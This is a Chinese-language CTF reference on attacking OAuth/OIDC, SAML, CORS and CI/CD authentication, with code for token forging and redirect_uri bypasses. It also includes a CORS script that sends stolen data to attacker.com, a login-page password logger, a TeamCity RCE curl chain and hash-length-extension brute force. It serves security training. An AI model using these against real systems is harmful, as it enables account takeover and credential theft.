# CTF Web - OAuth、SAML 与基础设施认证攻击

## 目录
- [OAuth/OIDC 利用](#oauthoidc-利用)
  - [开放重定向窃取 Token](#开放重定向窃取-token)
  - [OIDC ID Token 篡改](#oidc-id-token-篡改)
  - [OAuth state 参数 CSRF](#oauth-state-参数-csrf)
- [CORS 配置错误](#cors-配置错误)
- [Git 历史凭据泄露（Barrier HTB）](#git-历史凭据泄露barrier-htb)
- [CI/CD 变量凭据窃取（Barrier HTB）](#cicd-变量凭据窃取barrier-htb)
- [身份提供方 API 接管（Barrier HTB）](#身份提供方-api-接管barrier-htb)
- [SAML SSO 流程自动化（Barrier HTB）](#saml-sso-流程自动化barrier-htb)
- [Apache Guacamole 连接参数提取（Barrier HTB）](#apache-guacamole-连接参数提取barrier-htb)
- [登录页投毒收集凭据（Watcher HTB）](#登录页投毒收集凭据watcher-htb)
- [TeamCity REST API RCE（Watcher HTB）](#teamcity-rest-api-rcewatcher-htb)
- [Base64 解码宽容 + 参数覆盖绕过签名（BCTF 2016）](#base64-解码宽容--参数覆盖绕过签名bctf-2016)
- [哈希长度扩展攻击（ASIS CTF 2017）](#哈希长度扩展攻击asis-ctf-2017)

JWT/JWE token 攻击见 [auth-jwt.md](auth-jwt.md)。通用认证绕过与访问控制见 [auth-and-access.md](auth-and-access.md)。

## 现代 OAuth/OIDC 与基础设施补充（2025/2026）

### OAuth 邮箱规范化与别名混淆

应用可能把 `alice+debug@example.com` 当作独立身份，而身份提供方会把它归一化到同一账号。Gmail 等会转换 plus 寻址或大小写折叠地址的提供方尤其常见。

**检查：**
- 比对原始 token 与服务端用户记录
- 确保 `sub`/`oid` 才是规范身份，而不是邮箱文本
- 在把 `email` 当唯一标识前，先测多个别名

### `redirect_uri` 精确匹配绕过

数量惊人的 SSO 漏洞源于重定向校验薄弱，而非签名不当。常见绕过是接受只差主机名、路径规范化或子域后缀的回调。

**典型 payload：**
- `https://target.com/callback/../evil.com`
- `https://target.com.evil.com`
- 双重编码的主机部分
- 路径穿越或百分号编码反斜杠技巧

**最佳实践：** 把规范化后的重定向 URL 与 origin/path 对的精确白名单比对，而不是做前缀或后缀检查。

### state 与 nonce 跨租户复用

若后端接受 `state` 或 `nonce` 却不把它绑定到特定 `client_id`、浏览器会话或登录挑战，攻击者就能把一个会话的 SSO 回调重放到另一个请求上下文。

**留意：**
- `client_id` 不同时回调仍被接受
- 同一 `state` 值在多次登录尝试中复用
- `nonce` 存在但未绑定到具体会话或 redirect URI

### 经服务账号 token 接管 IdP API

身份提供方使用的服务账号或管理 token 可能存放在 CI/CD 变量、应用配置或备份文件中。可触达的话，它能改用户注册、密码重置、MFA 状态，甚至生成 SAML 断言。

**快速检查：**
- 检查 CI/CD 变量、Git 历史与配置文件中的 OIDC/IdP 凭据
- 枚举用户管理与密码重置的管理 API
- 看 MFA 是否有 `not_configured_action: skip`

### SAML 与 OIDC 回调投毒

最终重定向时回调可能缺失或忽略 `RelayState`、`session_state` 或 `state`。这使攻击者能把一个合法登录响应串到另一个用户或租户上下文。

**防御指引：** 把所有回调参数绑定到原始请求，并在签发会话前精确比对。

---

<a id="oauthoidc-exploitation"></a>
## OAuth/OIDC 利用

<a id="open-redirect-token-theft"></a>
### 开放重定向窃取 Token
```python
# OAuth authorization with redirect_uri manipulation
# If redirect_uri validation is weak, steal tokens via open redirect
import requests

# Step 1: Craft malicious authorization URL
auth_url = "https://target.com/oauth/authorize"
params = {
    "client_id": "legitimate_client",
    "redirect_uri": "https://target.com/callback/../@attacker.com",  # path traversal
    "response_type": "code",
    "scope": "openid profile"
}
# Victim clicks → auth code sent to attacker's server

# Common redirect_uri bypasses:
# https://target.com/callback?next=https://evil.com
# https://target.com/callback/../@evil.com
# https://target.com/callback%23@evil.com  (fragment)
# https://target.com/callback/.evil.com
# https://target.com.evil.com  (subdomain)
```

<a id="oidc-id-token-manipulation"></a>
### OIDC ID Token 篡改
```python
# If server accepts unsigned tokens (alg: none)
import jwt, json, base64

token = "eyJ..."  # captured ID token
header, payload, sig = token.split(".")
# Decode and modify
payload_data = json.loads(base64.urlsafe_b64decode(payload + "=="))
payload_data["sub"] = "admin"
payload_data["email"] = "admin@target.com"

# Re-encode with alg:none
new_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=")
new_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b"=")
forged = f"{new_header.decode()}.{new_payload.decode()}."
```

<a id="oauth-state-parameter-csrf"></a>
### OAuth state 参数 CSRF
```python
# Missing or predictable state parameter allows CSRF
# Attacker initiates OAuth flow, captures callback URL with auth code
# Sends callback URL to victim → victim's session linked to attacker's OAuth account

# Detection: Check if state parameter is:
# 1. Present in authorization request
# 2. Validated on callback
# 3. Bound to user session (not just random)
```

**关键点：** OAuth/OIDC（OpenID Connect）攻击通常瞄准 redirect_uri 校验（开放重定向 → token 窃取）、token 篡改（alg:none、JWKS 注入）或 state 参数 CSRF。始终用路径穿越、fragment 注入和子域技巧测试 redirect_uri。

---

<a id="cors-misconfiguration"></a>
## CORS 配置错误

```python
# Test for reflected Origin
import requests

targets = [
    "https://evil.com",
    "https://target.com.evil.com",
    "null",
    "https://target.com%60.evil.com",
]

for origin in targets:
    r = requests.get("https://target.com/api/sensitive",
                     headers={"Origin": origin})
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    if origin in acao or acao == "*":
        print(f"[!] Reflected: {origin} -> ACAO: {acao}, ACAC: {acac}")
```

```javascript
// Exploit: steal data via CORS misconfiguration
// Host on attacker server, victim visits this page
fetch('https://target.com/api/user/profile', {
    credentials: 'include'
}).then(r => r.json()).then(data => {
    fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
});
```

**关键点：** 当 `Access-Control-Allow-Origin` 反射 `Origin` 头且 `Access-Control-Allow-Credentials: true` 时，CORS（跨源资源共享）即可被利用。检查子域匹配缺陷（`*.target.com` 接受 `evil-target.com`）、接受 null origin（`sandbox` iframe），以及前缀/后缀匹配缺陷。

---

<a id="git-history-credential-leakage-barrier-htb"></a>
## Git 历史凭据泄露（Barrier HTB）

后续提交删掉的密钥仍留在 Git 历史里。在完整 diff 历史中搜索被删除的凭据：
```bash
git log --all --oneline
git show <first_commit>
# Search all history for a keyword across all branches:
git log -p --all -S "password"
```

**关键点：** `git log -p --all -S "keyword"` 会在每个提交 diff 中搜索任意字符串，包括已删除的密钥。始终检查最早几个提交和被删除的文件。

---

<a id="cicd-variable-credential-theft-barrier-htb"></a>
## CI/CD 变量凭据窃取（Barrier HTB）

CI/CD（持续集成/持续部署）变量用来存密钥（API token、密码），项目管理员可读。它们往往是对接服务（authentik、Vault、AWS）的管理级 token。
```bash
# GitLab: Settings -> CI/CD -> Variables (visible to project admins)
# GitHub: Settings -> Secrets and variables -> Actions
# Jenkins: Manage Jenkins -> Credentials
```

**关键点：** CI/CD 变量经常存有高权限服务账号 token。GitLab 项目管理员能读取所有 CI/CD 变量，其中可能包含身份提供方、密钥库或云平台的 token。

---

<a id="identity-provider-api-takeover-barrier-htb"></a>
## 身份提供方 API 接管（Barrier HTB）

利用身份提供方（authentik、Keycloak、Okta）的管理 API token 接管任意账号。

**攻击链：**
1. 枚举用户：`GET /api/v3/core/users/`
2. 设置目标用户密码：`POST /api/v3/core/users/{pk}/set_password/`
3. 检查认证流程各阶段 —— 若 MFA（多因素认证）为 `not_configured_action: skip`，未配置 MFA 设备时会自动跳过
4. 按步骤走完认证流程（GET 启动阶段、POST 提交、跟随 302）

**关键点：** 身份提供方的管理 token 就是王国钥匙。若 MFA 阶段为 `not_configured_action: skip`，设置用户密码就足以完全接管账号 —— 无需绕过 MFA。

---

<a id="saml-sso-flow-automation-barrier-htb"></a>
## SAML SSO 流程自动化（Barrier HTB）

当你掌握 IdP（身份提供方）凭据时，自动化 SAML（Security Assertion Markup Language）SSO 登录 Guacamole 或内部应用。

**步骤：**
1. 在服务端发起登录流程 —— 从重定向中捕获 `SAMLRequest` + `RelayState`
2. 用 IdP 认证（经 API 或会话）
3. 把 IdP 签名的 `SAMLResponse` + 原始 `RelayState` 提交到服务回调
4. 从 state 参数重定向中提取认证 token

**关键点：** 整条流程都要保留 `RelayState` —— 它把回调与登录请求关联。即便 `SAMLResponse` 合法，`RelayState` 不匹配也会认证失败。

---

<a id="apache-guacamole-connection-parameter-extraction-barrier-htb"></a>
## Apache Guacamole 连接参数提取（Barrier HTB）

Apache Guacamole 把 SSH 密钥、密码和连接信息存在 MySQL 中。有数据库访问权限或已认证 API token 即可提取：
```bash
# Via API with auth token
curl "http://TARGET:8080/guacamole/api/session/data/mysql/connections/1/parameters?token=$TOKEN"
# Returns: hostname, port, username, private-key, passphrase
```

```sql
-- Via MySQL directly
SELECT c.connection_name, cp.parameter_name, cp.parameter_value
FROM guacamole_connection c
JOIN guacamole_connection_parameter cp ON c.connection_id = cp.connection_id;
```

**关键点：** Guacamole 连接参数里是明文 SSH 私钥和口令。一个 API token 或一次数据库访问就能暴露所有受管主机的凭据。

---

<a id="login-page-poisoning-for-credential-harvesting-watcher-htb"></a>
## 登录页投毒收集凭据（Watcher HTB）

往 Web 应用登录页注入凭据记录器，捕获明文密码：
```php
// Add after successful login check in index.php:
$f = fopen('/dev/shm/creds.txt', 'a+');
fputs($f, "{$_POST['name']}:{$_POST['password']}\n");
fclose($f);
```

等待自动登录（机器人、cron 脚本）。查看审计日志中频繁登录的用户 —— 他们很可能有可收割的硬编码凭据。

**关键点：** `/dev/shm/` 是 tmpfs 挂载点，任何用户可写，且大多数监控看不到。自动化服务（备份脚本、健康检查）常按可预测的时间表用高权限凭据认证。

---

<a id="teamcity-rest-api-rce-watcher-htb"></a>
## TeamCity REST API RCE（Watcher HTB）

利用 TeamCity 管理员凭据，通过注入构建步骤实现 RCE（远程代码执行）：
```bash
# 1. Create project
curl -X POST 'http://HOST:8111/httpAuth/app/rest/projects' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<newProjectDescription name="pwn" id="pwn"><parentProject locator="id:_Root"/></newProjectDescription>'

# 2. Create build config
curl -X POST 'http://HOST:8111/httpAuth/app/rest/projects/pwn/buildTypes' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<newBuildTypeDescription name="rce" id="rce"><project id="pwn"/></newBuildTypeDescription>'

# 3. Add command-line build step
curl -X POST 'http://HOST:8111/httpAuth/app/rest/buildTypes/id:rce/steps' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<step name="cmd" type="simpleRunner"><properties>
    <property name="script.content" value="cat /root/root.txt"/>
    <property name="use.custom.script" value="true"/>
  </properties></step>'

# 4. Trigger build
curl -X POST 'http://HOST:8111/httpAuth/app/rest/buildQueue' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<build><buildType id="rce"/></build>'

# 5. Read build log for output
curl 'http://HOST:8111/httpAuth/downloadBuildLog.html?buildId=ID' -u 'USER:PASS'
```

**关键点：** 若构建代理以 root 运行，所有构建步骤都以 root 执行。用 `ps aux` 查看构建代理进程的属主。TeamCity REST API 提供完整的项目/构建管理能力 —— 管理员凭据 = RCE。

---

<a id="base64-decode-leniency-and-parameter-override-for-signature-bypass-bctf-2016"></a>
## Base64 解码宽容 + 参数覆盖绕过签名（BCTF 2016）

服务端对订单串做 RSA 签名，然后解析 `&` 分隔的参数。Python 的 `b64decode()` 会静默忽略非 base64 字符。在 base64 签名后追加 `&price=0` 即可同时利用这两种行为：

```python
# Original signed order: "item=widget&price=100"
# Server returns: base64(RSA_sign(order)) as signature

# Attack: append &price=0 after the signature
# b64decode("VALID_SIG_BASE64&price=0") silently ignores "&price=0"
# But the parameter parser sees: item=widget&price=100&price=0
# Last value wins: price=0
```

**关键点：** 被签名的内容（签名前部分）与被解析的内容（含签名后数据的完整串）之间存在缝隙，base64 对非字母表字符的容忍放大了这一点。任何把已签名数据与未签名参数拼接、并用宽容 base64 解码的系统都有漏洞。防御：对实际被解析的那串精确字节验签，而不是它的子集。

---

<a id="hash-length-extension-attack-asis-ctf-2017"></a>
## 哈希长度扩展攻击（ASIS CTF 2017）

**模式：** Merkle-Damgård 哈希（MD5、SHA-1、SHA-256）用作 `MAC = H(secret || message)` 时易受长度扩展攻击。已知 `H(secret || message)` 与 `secret` 的长度，攻击者无需知道 secret 就能算出 `H(secret || message || padding || extension)`。原摘要结束时的内部哈希状态足以继续哈希。

```python
# Vulnerable MAC construction:
import hashlib
mac = hashlib.sha256(secret + message).hexdigest()
# Server sends: mac + message to client, verifies by recomputing H(secret || message)

# Attack: extend the message without knowing the secret
# hashpumpy does the heavy lifting:
import hashpumpy

original_mac = "a1b2c3..."     # known hash
original_msg = b"user=alice"   # known message
secret_len   = 16              # known or brute-forced (try 1-100)
extension    = b"&admin=true"  # data to append

new_mac, new_msg = hashpumpy.hashpump(
    original_mac,   # original hexdigest
    original_msg,   # original data (without secret)
    extension,      # data to append
    secret_len      # secret length
)

# new_msg = original_msg + padding + extension
# new_mac = valid H(secret || new_msg) without knowing secret
```

```bash
# Alternative: hash_extender tool
hash_extender \
    --data "user=alice" \
    --secret-min 1 --secret-max 50 \
    --append "&admin=true" \
    --signature "a1b2c3..." \
    --format sha256

# Or: manual Python with hashpumpy, brute-force secret length
for length in range(1, 101):
    new_mac, new_msg = hashpumpy.hashpump(orig_mac, orig_msg, extension, length)
    r = requests.get(url, params={"data": new_msg.hex(), "mac": new_mac})
    if "success" in r.text:
        print(f"Secret length: {length}, Flag: {r.text}")
        break
```

**填充结构：** 原消息与扩展之间，哈希算法会插入其标准填充：
```text
original_msg || 0x80 || 0x00...0x00 || length_in_bits (8 bytes big-endian)
```
这段填充是 `new_msg` 的一部分 —— 服务端会原样验证它。

**易受攻击的算法：** MD5、SHA-1、SHA-224、SHA-256、SHA-384、SHA-512（均为 Merkle-Damgård）。**不受影响：** HMAC（两次独立哈希）、SHA-3/Keccak（海绵结构）、BLAKE2/3。

**关键点：** 任何以 `H(secret || data)` 形式使用、未走 HMAC 构造的 Merkle-Damgård 哈希，都会在消息边界泄露内部状态，从而允许任意消息扩展。用 `hashpumpy` 或 `hash_extender`。secret 长度未知就爆破（CTF 里 1-100 是合理范围）—— 正确的扩展会产出一个服务端接受的 MAC。
